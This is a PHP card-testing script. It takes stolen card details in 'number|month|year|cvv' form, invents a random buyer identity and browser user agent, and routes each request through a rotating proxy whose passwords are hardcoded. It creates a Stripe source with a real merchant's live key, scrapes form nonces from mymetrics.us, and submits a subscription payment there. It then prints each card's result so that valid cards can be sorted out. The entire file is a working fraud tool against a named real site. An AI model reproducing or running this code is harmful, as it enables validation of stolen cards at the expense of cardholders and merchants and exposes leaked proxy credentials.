<?php

const SP = "   ";

//================[Functions and Variables]================//
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function get_string_between($string, $start, $end){
	$string = " ".$string;
	$ini = strpos($string,$start);
	if ($ini == 0) return "";
	$ini += strlen($start);   
	$len = strpos($string,$end,$ini) - $ini;
	return substr($string,$ini,$len);
}

function pre_r($array){
    echo "<pre>";
    print_r($array);
    echo "</pre>";
}
//================[Functions and Variables]================//

//==================[Randomizing Details]======================//
$letters='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
$lettersArray = str_split($letters);
$fname = '';
$lname = '';
for($i=0; $i<7; $i++){
    $fname .= $lettersArray[array_rand($lettersArray)];
    $lname .= $lettersArray[array_rand($lettersArray)];
}
$email = $fname.$lname.rand(10,99).'@gmail.com';
$zip = rand(10000,99999);
$useragent = 'Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'';
//==================[End Randomizing Details]======================//

//==================[Proxy setup]======================//
$proxyPasses = array(
    'dhssccps-rotate:rn6q65ufxqsl',
    'eciultpq-rotate:21no8en4737j'
);
//==================[End Proxy setup]======================//

//==================[REQ1]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPasses[array_rand($proxyPasses)]);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_REFERER, $_SERVER['REQUEST_URI']);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'sec-gpc: 1',
    'user-agent: '.$useragent
));

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=Fiery+King&owner[email]='.$email.'&owner[address][postal_code]='.$zip.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&payment_user_agent=stripe.js%2F7857ab2cf%3B+stripe-js-v3%2F7857ab2cf&time_on_page=47631&key=pk_live_51IDc69L6104Bjbov7ri7A6iiAiRTjNNhSFvU8IOQv57BPTqF6sfOLNXH3Jxd2KXU480eRTWLK63IQlqRXyZOEiU300X6KDbxcO');

$result1 = curl_exec($ch);
$res1 = json_decode($result1, 1);

$src = $res1['id'];
//==================[END REQ1]======================//

//==================[REQ2]======================//
curl_setopt($ch, CURLOPT_URL, 'https://mymetrics.us/Pricing/');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'content-type: application/x-www-form-urlencoded',
    'user-agent: '.$useragent
));
$result2 = curl_exec($ch);
$nonce = get_string_between($result2, '"nonce":"', '"');
$wpnonce = get_string_between($result2, 'name="_wpnonce" value="', '"');
$simpaynonce = get_string_between($result2, 'name="simpay_coupon_nonce" value="', '"');

//==================[END REQ2]======================//

//==================[REQ3]======================//
curl_setopt($ch, CURLOPT_URL, 'https://mymetrics.us/wp-json/wpsp/v2/customer');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: */*',
    'accept-language: en-US,en;q=0.9',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://mymetrics.us',
    'referer: https://mymetrics.us/Pricing/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'sec-gpc: 1',
    'user-agent: '.$useragent,
    'x-requested-with: XMLHttpRequest',
    'x-wp-nonce: '.$nonce
));
curl_setopt($ch, CURLOPT_POSTFIELDS, "form_values%5Bsimpay_email%5D=".$email."&form_values%5Bsimpay_coupon_nonce%5D=$simpaynonce&form_values%5B_wp_http_referer%5D%5B%5D=%2FPricing%2F&form_values%5B_wp_http_referer%5D%5B%5D=%2FPricing%2F&form_values%5Bsimpay_form_id%5D=569&form_values%5Bsimpay_amount%5D=150000&form_values%5B_wpnonce%5D=".$wpnonce."&form_data%5BformId%5D=569&form_data%5BformInstance%5D=0&form_data%5Bquantity%5D=1&form_data%5BisValid%5D=true&form_data%5BstripeParams%5D%5Bkey%5D=pk_live_51IDc69L6104Bjbov7ri7A6iiAiRTjNNhSFvU8IOQv57BPTqF6sfOLNXH3Jxd2KXU480eRTWLK63IQlqRXyZOEiU300X6KDbxcO&form_data%5BstripeParams%5D%5Bsuccess_url%5D=https%3A%2F%2Fmymetrics.us%2F60-mins-meeting%2F%3Fform_id%3D569&form_data%5BstripeParams%5D%5Berror_url%5D=https%3A%2F%2Fmymetrics.us%2Fpayment-failed%2F%3Fform_id%3D569&form_data%5BstripeParams%5D%5Bname%5D=MyMetrics&form_data%5BstripeParams%5D%5Blocale%5D=en&form_data%5BstripeParams%5D%5Bcountry%5D=US&form_data%5BstripeParams%5D%5Bcurrency%5D=USD&form_data%5BstripeParams%5D%5Bdescription%5D=LITE+%3A+MONTHLY&form_data%5BstripeParams%5D%5BelementsLocale%5D=auto&form_data%5BstripeParams%5D%5Bamount%5D=150000&form_data%5BisTestMode%5D=false&form_data%5BisSubscription%5D=true&form_data%5BisTrial%5D=false&form_data%5BhasCustomerFields%5D=true&form_data%5BhasPaymentRequestButton%5D=false&form_data%5Bamount%5D=500&form_data%5BsetupFee%5D=1000&form_data%5BminAmount%5D=1&form_data%5BtotalAmount%5D=&form_data%5BsubMinAmount%5D=1&form_data%5BplanIntervalCount%5D=1&form_data%5BtaxPercent%5D=0&form_data%5BfeePercent%5D=0&form_data%5BfeeAmount%5D=0&form_data%5BstripeErrorMessages%5D%5Binvalid_number%5D=The+card+number+is+not+a+valid+credit+card+number.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_month%5D=The+card's+expiration+month+is+invalid.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_year%5D=The+card's+expiration+year+is+invalid.&form_data%5BstripeErrorMessages%5D%5Binvalid_cvc%5D=The+card's+security+code+is+invalid.&form_data%5BstripeErrorMessages%5D%5Bincorrect_number%5D=The+card+number+is+incorrect.&form_data%5BstripeErrorMessages%5D%5Bincomplete_number%5D=The+card+number+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bincomplete_cvc%5D=The+card's+security+code+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bincomplete_expiry%5D=The+card's+expiration+date+is+incomplete.&form_data%5BstripeErrorMessages%5D%5Bexpired_card%5D=The+card+has+expired.&form_data%5BstripeErrorMessages%5D%5Bincorrect_cvc%5D=The+card's+security+code+is+incorrect.&form_data%5BstripeErrorMessages%5D%5Bincorrect_zip%5D=The+card's+zip+code+failed+validation.&form_data%5BstripeErrorMessages%5D%5Binvalid_expiry_year_past%5D=The+card's+expiration+year+is+in+the+past&form_data%5BstripeErrorMessages%5D%5Bcard_declined%5D=The+card+was+declined.&form_data%5BstripeErrorMessages%5D%5Bprocessing_error%5D=An+error+occurred+while+processing+the+card.&form_data%5BstripeErrorMessages%5D%5Binvalid_request_error%5D=Unable+to+process+this+payment%2C+please+try+again+or+use+alternative+method.&form_data%5BstripeErrorMessages%5D%5Bemail_invalid%5D=Invalid+email+address%2C+please+correct+and+try+again.&form_data%5BminCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BsubMinCustomAmountError%5D=The+minimum+amount+allowed+is+%26%2336%3B1.00&form_data%5BpaymentButtonText%5D=Pay+with+Card&form_data%5BpaymentButtonLoadingText%5D=Please+Wait...&form_data%5BcompanyName%5D=MyMetrics&form_data%5BsubscriptionType%5D=single&form_data%5BplanInterval%5D=month&form_data%5BcheckoutButtonText%5D=Pay+%7B%7Bamount%7D%7D&form_data%5BcheckoutButtonLoadingText%5D=Please+Wait...&form_data%5BdateFormat%5D=mm%2Fdd%2Fyy&form_data%5BformDisplayType%5D=overlay&form_data%5BpaymentMethods%5D%5B0%5D%5Bid%5D=card&form_data%5BpaymentMethods%5D%5B0%5D%5Bname%5D=Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bnicename%5D=Credit+Card&form_data%5BpaymentMethods%5D%5B0%5D%5Bflow%5D=none&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aed&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=afn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=all&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=amd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ang&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aoa&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ars&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=aud&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=awg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=azn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bam&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bdt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bgn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bhd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bif&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bob&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=brl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=btn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bwp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=byr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=bzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cdf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=chf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=clp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cny&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=crc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cuc&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cup&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=cve&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=czk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=djf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dkk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=dzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=egp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ern&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=etb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=eur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fjd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=fkp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gel&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ggp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ghs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gip&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gnf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gtq&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=gyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hnl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=hrk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=htg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=huf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=idr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ils&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=imp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=inr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=iqd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=irr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=isk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jep&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jmd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jod&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=jpy&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kes&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kgs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=khr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kmf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kpw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=krw&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kwd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=kzt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lak&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lbp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lrd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lsl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=lyd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mdl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mga&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mkd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mmk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mnt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mop&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mro&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mur&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mvr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mwk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mxn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=myr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=mzn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nad&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ngn&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nio&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nok&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=npr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=nzd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=omr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pab&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pen&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pgk&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=php&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pkr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pln&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=prb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=pyg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=qar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rmb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ron&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rsd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rub&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=rwf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sbd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=scr&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sdg&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sek&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sgd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=shp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sll&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=sos&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=srd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ssp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=std&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=syp&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=szl&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=thb&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tjs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tmt&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=top&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=try&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ttd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=twd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=tzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uah&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=ugx&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=usd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uyu&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=uzs&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vef&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vnd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=vuv&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=wst&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xaf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xcd&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xof&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=xpf&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=yer&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zar&form_data%5BpaymentMethods%5D%5B0%5D%5Bcurrencies%5D%5B%5D=zmw&form_data%5BpaymentMethods%5D%5B0%5D%5Brecurring%5D=true&form_data%5BpaymentMethods%5D%5B0%5D%5Bstripe_checkout%5D=true&form_data%5BfinalAmount%5D=1500.00&form_id=569&source_id=".$src."");
$result3 = curl_exec($ch);
$res3 = json_decode($result3, 1);
$message = $res3['message'];
curl_close($ch);
//==================[END REQ3]======================//


if(isset($res1['error'])){
    echo $lista." -> ".$res1['error']['code'];
}else{
    echo $lista." -> ".$result3;
}

ob_flush();





?>